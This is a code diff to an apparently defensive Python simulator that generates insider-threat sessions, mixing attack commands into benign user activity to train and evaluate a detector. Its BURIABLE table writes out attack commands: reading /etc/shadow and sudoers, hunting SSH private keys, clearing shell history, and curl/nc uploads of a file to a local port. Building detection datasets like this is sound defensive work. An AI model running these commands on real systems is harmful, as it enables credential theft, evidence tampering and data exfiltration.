@@ -89,17 +89,37 @@ GROUND_TRUTH_PATH = os.path.join(os.path.dirname(__file__), "out", "ground_truth
 # scenarios (privesc/cred_access/exfil yielded none; ART assumes disposable VMs, not
 # a shared lab -- see curate_atomic_redteam.py docstring). Both are optional: falls
 # back to the hand-built defaults below if the curated files aren't present.
-_COMMANDS_DIR = os.path.join(os.path.dirname(__file__), "commands_dataset")
+# NOTE: the curated corpora moved to dataset_generation/commands_dataset/ in the
+# 2026-08-03 restructure. This path was not updated, and because _load_json fell
+# back SILENTLY, every session collected since then drew from the 4-6 hand-built
+# core commands alone -- no curated benign vocabulary, no Atomic Red Team attack
+# variants. That is a large part of why the first batch was so repetitive.
+# _load_json now warns instead of failing quietly.
+_COMMANDS_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+                             "dataset_generation", "commands_dataset")
 
 
 def _load_json(path: str) -> dict:
     if not os.path.isfile(path):
+        print(f"[simulate] WARNING: curated corpus not found: {path} "
+              f"-- falling back to the built-in core commands only", file=sys.stderr)
         return {}
     with open(path, encoding="utf-8") as fh:
         return json.load(fh)
 
 
-BENIGN_CURATED = _load_json(os.path.join(_COMMANDS_DIR, "persona_commands_curated.json"))
+# ─────────────────────── benign-corpus safety filter ────────────────────────
+# The rule lives in dataset_generation/command_safety.py because BOTH the
+# collector (safety: this filler really executes as root) and the generator
+# (parity: both benign vocabularies must be drawn from the same population) need
+# exactly the same definition. See that module's docstring for why.
+sys.path.insert(0, os.path.dirname(_COMMANDS_DIR))
+from command_safety import is_safe_benign, filter_corpus   # noqa: E402
+
+
+BENIGN_CURATED = filter_corpus(
+    _load_json(os.path.join(_COMMANDS_DIR, "persona_commands_curated.json")),
+    label="simulate")
 _ATTACK_CURATED_RAW = _load_json(os.path.join(_COMMANDS_DIR, "attack_commands_curated.json"))
 
 # ─────────────────────────── scenario library ───────────────────────────────
@@ -220,12 +240,126 @@ BENIGN_PERSONAS = BENIGN_PERSONAS_CORE  # back-compat alias (e.g. --list, person
 
 def get_benign_commands(persona: str, extra: int = 4) -> list:
     """Core commands (always included) + up to `extra` random commands sampled
-    from the curated public dataset (empty extra pool -> core only)."""
+    from the curated public dataset (empty extra pool -> core only).
+
+    Fixed-length, all-distinct: kept for --no-vary / back-compat. compose_benign()
+    is what a normal run uses -- see the SESSION COMPOSITION block below."""
     core = list(BENIGN_PERSONAS_CORE[persona])
     pool = BENIGN_CURATED.get(persona, [])
     if pool:
         core += random.sample(pool, min(extra, len(pool)))
     return core
+
+
+# ─────────────────────── session composition ────────────────────────────────
+# Two defects were MEASURED in the first collected batch (ml/unsupervised/train.py),
+# and both are properties of how this script composed sessions, not of the lab:
+#
+#   1. unique_command_ratio == 1.00 in every real session, because a session was
+#      a fixed list of distinct commands run once. Real users repeat themselves.
+#      The domain gate consequently rejected unique_command_ratio (KS 0.94) and
+#      command_entropy (KS 0.69) -- a model trained on generated benign would
+#      have flagged every real session for being real.
+#
+#   2. An attack session was 100% attack commands, so avg_command_length alone
+#      scored AUC 0.832 on the eval set: the detector was reading "long command",
+#      not behaviour. Real insider activity is a handful of malicious commands
+#      inside an otherwise ordinary session.
+#
+# So sessions are now COMPOSED rather than replayed:
+#
+#   benign   variable length, sampled with repetition (--stickiness)
+#   attack   one of three compositions, chosen per session (--bury-rate):
+#              full      the scenario alone, as before -- the loud end of the
+#                        intensity gradient, kept so it stays represented
+#              diluted   the whole scenario, benign filler interleaved between
+#                        its commands (relative order preserved, so every
+#                        create-then-delete pair still cleans up)
+#              minimal   1-2 read-only attack commands buried in a benign session
+#
+# SAFETY: `minimal` draws only from BURIABLE, which is read-only by construction
+# -- no command there creates state, so a session that never reaches a cleanup
+# step cannot leave anything behind on the target. Multi-step scenarios that DO
+# create state are only ever run whole (full/diluted).
+
+# Read-only commands that still carry their tactic, safe to run standalone.
+BURIABLE = {
+    "recon": ["whoami", "id", "uname -a", "netstat -tulnp", "last -n 5", "ps aux"],
+    "cred_access": [
+        "{sudo}cat /etc/shadow",
+        "cat ~/.ssh/authorized_keys 2>/dev/null",
+        "{sudo}find /root /home /etc -name id_rsa 2>/dev/null",
+        "find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null",
+    ],
+    "privesc": ["sudo -l", "{sudo}cat /etc/sudoers",
+                "find /usr/bin -perm -4000 -type f 2>/dev/null"],
+    "persistence": ["crontab -l", "{sudo}ls -la /etc/cron.d/", "{sudo}cat /etc/crontab"],
+    "log_tamper": ["history -c", "{sudo}ls -la /var/log/", "last"],
+    "exfil": [
+        "curl -s -m 3 -X POST -F file=@/etc/hostname http://127.0.0.1:9999/upload 2>&1 | head -3",
+        "nc -w 2 127.0.0.1 9999 < /etc/hostname 2>&1",
+    ],
+}
+
+# Which persona's routine an attacker's session looks like. p_admin has no
+# persona of its own; admin traffic is the closest cover.
+ACCOUNT_PERSONA = {"p_dev": "dev", "p_dba": "dba", "p_audit": "auditor",
+                   "bastionsvc": "admin", "p_admin": "admin"}
+
+
+def sample_filler(persona: str, n: int, stickiness: float) -> list:
+    """n benign commands drawn WITH repetition. stickiness = P(re-issue something
+    already typed this session) -- the knob that stops unique_command_ratio
+    pinning at 1.0. Mirrors generate_benign.py so both sides of the dataset are
+    repetitive in the same way."""
+    pool = list(BENIGN_PERSONAS_CORE[persona]) + list(BENIGN_CURATED.get(persona, []))
+    issued: list = []
+    for _ in range(max(0, n)):
+        if issued and random.random() < stickiness:
+            issued.append(random.choice(issued))
+        else:
+            issued.append(random.choice(pool))
+    return issued
+
+
+def interleave(attack: list, filler: list) -> list:
+    """Merge two lists at random while preserving the order WITHIN each. Attack
+    steps therefore keep their sequence -- create still precedes its cleanup."""
+    a, f, out = list(attack), list(filler), []
+    while a or f:
+        if not a:
+            out.append(f.pop(0))
+        elif not f:
+            out.append(a.pop(0))
+        elif random.random() < len(a) / (len(a) + len(f)):
+            out.append(a.pop(0))
+        else:
+            out.append(f.pop(0))
+    return out
+
+
+def compose_benign(persona: str, stickiness: float, length_range: tuple) -> list:
+    """A benign session of random length, with repeats. The persona's core
+    commands stay likely (they are in the pool) but are no longer guaranteed --
+    a fixed prefix in every session is itself a giveaway."""
+    return sample_filler(persona, random.randint(*length_range), stickiness)
+
+
+def compose_attack(scenario: str, commands: list, persona: str, bury_rate: float,
+                   stickiness: float, length_range: tuple) -> tuple:
+    """Returns (commands, composition_label). See the block comment above."""
+    if random.random() >= bury_rate:
+        return commands, "full"
+
+    buriable = BURIABLE.get(scenario)
+    if buriable and random.random() < 0.5:
+        picked = random.sample(buriable, min(random.randint(1, 2), len(buriable)))
+        filler = sample_filler(persona, random.randint(*length_range), stickiness)
+        return interleave(picked, filler), "minimal"
+
+    # Dilute: keep the scenario whole (cleanup intact), pad around it.
+    filler = sample_filler(persona, max(2, len(commands)), stickiness)
+    return interleave(commands, filler), "diluted"
 
 
 def get_attack_commands(scenario: str) -> tuple:
@@ -372,6 +506,18 @@ def main(argv: Optional[List[str]] = None) -> int:
                          "than p_admin are NOPASSWD sudoers -- root-only steps get a 'sudo ' "
                          "prefix automatically. This is the real insider-threat signal: a "
                          "normal-role account doing privileged things it shouldn't.")
+    p.add_argument("--stickiness", type=float, default=0.30,
+                    help="P(a command re-uses one already issued this session). "
+                         "0 reproduces the old all-distinct sessions, which is what "
+                         "pinned unique_command_ratio at 1.0 in the first batch.")
+    p.add_argument("--bury-rate", type=float, default=0.70,
+                    help="fraction of attack sessions hidden inside benign activity "
+                         "(diluted or minimal); the rest run the scenario alone")
+    p.add_argument("--benign-length", default="4,14",
+                    help="min,max commands per benign session")
+    p.add_argument("--no-vary", action="store_true",
+                    help="disable composition entirely: fixed all-distinct sessions, "
+                         "attacks always 'full' (the pre-2026-08-07 behaviour)")
     p.add_argument("--dry-run", action="store_true", help="print commands, don't connect")
     p.add_argument("--verbose", action="store_true", help="print each command as it's sent")
     p.add_argument("--list", action="store_true", help="list scenarios and exit")
@@ -402,6 +548,14 @@ def main(argv: Optional[List[str]] = None) -> int:
               f"(available: {ATTACK_CAPABLE_ACCOUNTS})", file=sys.stderr)
         return 1
 
+    try:
+        lo, hi = (int(x) for x in args.benign_length.split(","))
+        benign_length = (lo, hi) if lo <= hi else (hi, lo)
+    except ValueError:
+        print(f"[simulate] --benign-length wants 'min,max', got {args.benign_length!r}",
+              file=sys.stderr)
+        return 1
+
     plan = []
     acc_i = 0
     for name in attack_names:
@@ -427,12 +581,27 @@ def main(argv: Optional[List[str]] = None) -> int:
             commands, variant = get_attack_commands(name)
             rule_ids = spec["rule_ids"]
             mitre = spec["mitre"]
+            attack_len = len(commands)
+            if args.no_vary:
+                composition = "full"
+            else:
+                commands, composition = compose_attack(
+                    name, commands, ACCOUNT_PERSONA.get(account, "admin"),
+                    args.bury_rate, args.stickiness, benign_length)
+                if composition == "minimal":
+                    # a minimal burial replaces the scenario with 1-2 of its
+                    # read-only commands, so the count changes
+                    attack_len = sum(1 for c in commands if c in
+                                     [b for b in BURIABLE.get(name, [])])
         else:
             spec = None
-            commands = get_benign_commands(name)
+            composition = "fixed" if args.no_vary else "sampled"
+            commands = (get_benign_commands(name) if args.no_vary
+                        else compose_benign(name, args.stickiness, benign_length))
             variant = "core+curated"
             rule_ids = []
             mitre = []
+            attack_len = 0
 
         print(f"[simulate] running {kind}:{name} tag={tag} account={account}", file=sys.stderr)
         commands_denied: List[str] = []
@@ -459,6 +628,14 @@ def main(argv: Optional[List[str]] = None) -> int:
                 "kind": kind,               # "attack" | "benign"
                 "scenario": name,           # attack type or persona
                 "variant": variant,         # "default" | "art:<technique>:<test_name>" | "core+curated"
+                # How the session was composed. Needed at eval time: a detector
+                # that only catches composition="full" has caught the loud case
+                # and missed the realistic one, and the report has to separate
+                # those two recalls rather than average them away.
+                "composition": composition,     # full | diluted | minimal | sampled | fixed
+                "attack_command_count": attack_len,
+                "total_command_count": len(commands),
+                "stickiness": args.stickiness,
                 "expected_rule_ids": rule_ids,
                 "mitre": mitre,
                 "target_hostname": TARGET_HOST,
